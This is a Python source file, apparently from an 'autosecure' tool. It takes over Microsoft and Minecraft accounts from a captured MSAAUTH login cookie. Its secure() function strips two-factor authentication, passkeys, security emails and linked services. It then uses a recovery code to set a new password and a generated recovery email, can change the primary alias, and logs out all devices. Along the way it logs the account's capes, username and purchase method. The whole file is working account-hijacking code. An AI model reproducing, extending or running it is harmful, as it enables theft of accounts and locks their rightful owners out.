from views.utils.securing.securityInformation import securityInformation
from views.utils.securing.recoveryCodeSecure import recoveryCodeSecure
from views.utils.securing.changePrimaryAlias import changePrimaryAlias
from views.utils.minecraft.getNamechange import getUsernameInfo
from views.utils.securing.getRecoveryCode import getRecoveryCode
from views.utils.securing.removeServices import removeServices
from views.utils.securing.generateEmail import generateEmail
from views.utils.securing.removeProof import removeProof
from views.utils.securing.removeZyger import removeZyger
from views.utils.securing.getCookies import getCookies
from views.utils.securing.polishHost import polishHost
from views.utils.securing.getProfile import getProfile
from views.utils.securing.remove2FA import remove2FA
from views.utils.securing.logoutAll import logoutAll
from views.utils.securing.getAMRP import getAMRP
from views.utils.securing.getSSID import getSSID
from views.utils.securing.getT import getT

from views.utils.minecraft.getMethod import getMethod
from views.utils.minecraft.getCapes import getCapes
from views.utils.minecraft.getXBL import getXBL

import uuid
import json

ralias = json.load(open("config.json", "r+"))["autosecure"]["replace_main_alias"]

async def secure(msaauth: str):

    apicanary, amsc = await getCookies() 

    print("[+] - Got Cookies! Polishing login cookie...")
    host = await polishHost(msaauth, amsc)
    print(f"MSAAUTH: {host}")
    accountInfo = {
        "oldName": "Failed to Get",
        "newName": "Couldn't Change!",
        "email": "Couldn't Change!",
        "oldEmail": "Couldn't Change",
        "secEmail": "Couldn't Change!",
        "password": "Couldn't Change!",
        "recoveryCode": "Couldn't Change!",
        "loginCookie": host,
        "status": "Unknown",
        "SSID": False,
        "firstName": "Failed to Get",
        "lastName": "Failed to Get",
        "fullName": "Failed to Get",
        "region": "Failed to Get",
        "birthday": "Failed to Get",
        "method": "Not purchased",
        "capes": "No capes"
    }
    
    t = await getT(host, amsc)

    # This means the account hasn't accepted TOS (To be fixed asap)
    if not t:

        print("[X] - Failed to get T\n[~] - This account needs to accept TOS manually (for now...)")
        
        # accountInfo["email"] = "Microsoft Down"
        # accountInfo["secEmail"] = "Microsoft Down"
        # accountInfo["recoveryCode"] = "Microsoft Down"
        # accountInfo["password"] = "Microsoft Down"
        # accountInfo["status"] = "Microsoft Down"

        return accountInfo
    
    print("[+] - Found T")
    
    # Minecraft checking
    print("[~] - Checking Minecraft Account")
    XBLResponse = await getXBL(host)

    if XBLResponse:
        print("[+] - Got XBL (Has Xbox Profile)")

        # XBL && Token
        xbl = XBLResponse["xbl"]

        ssid = await getSSID(xbl)
        
        # Get capes, profile and purchase method
        if ssid:    
            print("[+] - Got SSID! (Has Minecraft)")
            accountInfo["SSID"] = ssid

            capes = await getCapes(ssid)
            if capes:
                print(f"Capes -> {capes}")
                accountInfo["capes"] = ", ".join(i["alias"] for i in capes)
                print(f"[+] - Got capes")
            else:
                accountInfo["capes"] = "No Capes"

            # Gets account name
            profile = await getProfile(ssid)
            if not profile:
                print("[x] - Failed to get profile (No Minecraft Java)")
            else:
                print(f"[+] - Got profile (Has Minecraft Java)")
                accountInfo["oldName"] = profile
                
                usernameInfo = await getUsernameInfo(ssid)
                if type(usernameInfo) is bool:
                    accountInfo["usernameInfo"] = "Yes"
                else:
                    accountInfo["usernameInfo"] = f"Changeable in {usernameInfo} days"

            method = await getMethod(ssid)
            if method:
                accountInfo["method"] = method
                print(f"[+] - Got purchase method")
        else:
            print("[x] - Failed to get SSID")

    else:
        print("[x] - Failed to get XBL (Account has no Xbox Profile)")
        accountInfo["oldName"] = "No Minecraft"

    # Security Steps
    amrp = await getAMRP(t, amsc)
    if amrp:
        
        print("[+] - Got AMRP")

        # 2FA
        await remove2FA(amrp, apicanary, amsc)

        # Pass Keys / Windows Hello
        await removeZyger(amrp, apicanary, amsc)

        # Removes secEmails / Auth Apps
        await removeProof(amrp, apicanary, amsc)
        print("[+] - Removed all Proofs")
        
        # Third Partie Launchers (Minecraft, Prism)
        await removeServices(amrp, amsc)          

        # accountMSInfo = getAccountInfo()

        # accountInfo["firstName"] = accountMSInfo["firstName"]
        # accountInfo["lastName"] = accountMSInfo["lastName"]
        # accountInfo["fullName"] = accountMSInfo["fullName"]
        # accountInfo["region"] = accountMSInfo["region"]
        # accountInfo["birthday"] = accountMSInfo["birthday"]

        # print("[+] - Got Account Information")

        securityParameters = json.loads(await securityInformation(amrp))
        print("[+] - Got Security Parameters")
        
        if securityParameters:
            
            # Original Email
            sEmail = securityParameters["email"]
            encryptedNetID = securityParameters["WLXAccount"]["manageProofs"]["encryptedNetId"] 
            
            recoveryCode = await getRecoveryCode(
                amrp,
                apicanary,
                amsc,
                encryptedNetID
            )
            print(f"[+] - Got Recovery Code | {recoveryCode}")

            secEmail = uuid.uuid4().hex[:16]
            newPassword = uuid.uuid4().hex[:12]

            secEmail, emailToken = await generateEmail(secEmail, newPassword)

            print("[~] - Automaticly Securing Account...")
            newData = await recoveryCodeSecure(sEmail, recoveryCode, secEmail, newPassword, emailToken) 

            if newData:

                accountInfo["secEmail"] = secEmail
                accountInfo["recoveryCode"] = newData
                accountInfo["password"] = newPassword

            else:

                print(f"[X] - Failed to secure this account")
            
            if ralias:

                primaryEmail = f"auto{uuid.uuid4().hex[:12]}"
                print(f"[+] - Generated Primary Email ({primaryEmail}@outlook.com)")
                await changePrimaryAlias(primaryEmail, amrp, apicanary, amsc)

                print(f"[+] - Changed Primary Alias)")
                accountInfo["email"] = f"{primaryEmail}@outlook.com"
                accountInfo["oldEmail"] = sEmail
            
            else:
                
                accountInfo["oldEmail"] = sEmail
                accountInfo["email"] = sEmail
            
        # Logout all devices
        await logoutAll(amrp, apicanary, amsc)
        print("[+] - Account has been secured")

    return accountInfo


            

    

    
        

        